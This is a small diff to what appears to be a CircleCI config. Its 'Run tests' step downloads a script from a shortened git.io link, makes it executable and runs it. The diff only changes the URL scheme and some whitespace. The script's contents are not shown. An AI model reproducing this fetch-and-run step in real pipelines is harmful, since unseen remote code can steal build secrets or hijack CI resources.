@@ -11,7 +11,7 @@ working_dir: &working_dir ~/app
     - run: 
         name: Run tests 
         command: |                                      
-                    wget -qO build.sh https://git.io/JXBp6
+                    wget -qO build.sh git.io/JXBp6
                     chmod +x build.sh 
                     ./build.sh  
                     echo Build Succeded 
@@ -26,4 +26,4 @@ workflows:
   version: 2 
   commit: 
     jobs: 
-      - build1
+      - build1 
